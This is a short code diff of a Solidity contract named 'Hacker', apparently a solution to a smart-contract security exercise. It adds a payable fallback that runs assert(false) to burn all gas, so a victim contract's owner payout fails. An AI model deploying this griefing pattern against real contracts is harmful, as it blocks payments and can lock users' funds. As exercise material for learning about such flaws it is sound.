@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.8.5 <0.9.0;
+pragma solidity ^0.6.0;
 
 contract Hacker {
   address public hacker;
@@ -9,9 +9,14 @@ contract Hacker {
     _;
   }
 
-  constructor() {
-    hacker = payable(msg.sender);
+  constructor() public {
+    hacker = msg.sender;
   }
 
   function attack(address _target) public onlyHacker {}
+
+  /// @dev Consume all gas for the transaction, thus, the owner will have insufficient gas to `transfer`.
+  fallback() external payable {
+    assert(false);
+  }
 }
